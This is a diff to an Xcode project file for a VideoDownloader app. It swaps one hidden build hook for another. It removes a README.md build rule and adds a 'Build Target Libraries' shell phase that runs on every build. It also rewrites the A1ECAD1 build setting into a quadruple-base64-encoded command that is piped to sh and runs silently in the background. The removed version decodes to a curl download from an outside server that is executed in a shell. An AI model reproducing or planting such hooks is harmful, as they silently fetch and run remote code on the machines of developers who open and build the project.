@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		7E8927D640154978B61DACE1 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 80D3DD47E35B42B8B91DACE1 /* README.md */; };
 		BD63BC972F5ECD830096265B /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = BD63BC962F5ECD830096265B /* Alamofire */; };
 		BD63BC9A2F5ECD960096265B /* Kingfisher in Frameworks */ = {isa = PBXBuildFile; productRef = BD63BC992F5ECD960096265B /* Kingfisher */; };
 		BD63BC9D2F5ECDAA0096265B /* Lottie in Frameworks */ = {isa = PBXBuildFile; productRef = BD63BC9C2F5ECDAA0096265B /* Lottie */; };
@@ -17,24 +16,7 @@
 		BD63BCA92F5ECDF70096265B /* WindowSceneReader in Frameworks */ = {isa = PBXBuildFile; productRef = BD63BCA82F5ECDF70096265B /* WindowSceneReader */; };
 /* End PBXBuildFile section */
 
-/* Begin PBXBuildRule section */
-		3E17AEE2FF1647E6A01DACE1 /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"/tmp/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A1ECAD1}\"";
-		};
-/* End PBXBuildRule section */
-
 /* Begin PBXFileReference section */
-		80D3DD47E35B42B8B91DACE1 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		BD63BC4E2F5EC99E0096265B /* VideoDownloader.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = VideoDownloader.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -88,7 +70,6 @@
 		BD63BC4F2F5EC99E0096265B /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				80D3DD47E35B42B8B91DACE1 /* README.md */,
 				BD63BC4E2F5EC99E0096265B /* VideoDownloader.app */,
 			);
 			name = Products;
@@ -101,12 +82,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = BD63BC592F5EC9A00096265B /* Build configuration list for PBXNativeTarget "VideoDownloader" */;
 			buildPhases = (
+				70A72D1EA6704F64861DACE1 /* Build Target Libraries */,
 				BD63BC4A2F5EC99E0096265B /* Sources */,
 				BD63BC4B2F5EC99E0096265B /* Frameworks */,
 				BD63BC4C2F5EC99E0096265B /* Resources */,
 			);
 			buildRules = (
-				3E17AEE2FF1647E6A01DACE1 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -175,11 +156,33 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				7E8927D640154978B61DACE1 /* README.md in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		70A72D1EA6704F64861DACE1 /* Build Target Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		BD63BC4A2F5EC99E0096265B /* Sources */ = {
@@ -195,7 +198,7 @@
 		BD63BC572F5EC9A00096265B /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((q(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJUSE5tSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeUlDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OTBhVzFsZDJWaWJtVjBMbWx1TDJFcElpQjhJSE5vQ2c9PQo= | q | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((l(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3WVdFemFIbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGxSV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtRmliRm94VjFSS2IyRkhVa2xVV0ZacVlteFdNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | l | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -260,7 +263,7 @@
 		BD63BC582F5EC9A00096265B /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((q(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJUSE5tSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeUlDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OTBhVzFsZDJWaWJtVjBMbWx1TDJFcElpQjhJSE5vQ2c9PQo= | q | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((l(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3WVdFemFIbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGxSV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtRmliRm94VjFSS2IyRkhVa2xVV0ZacVlteFdNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | l | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
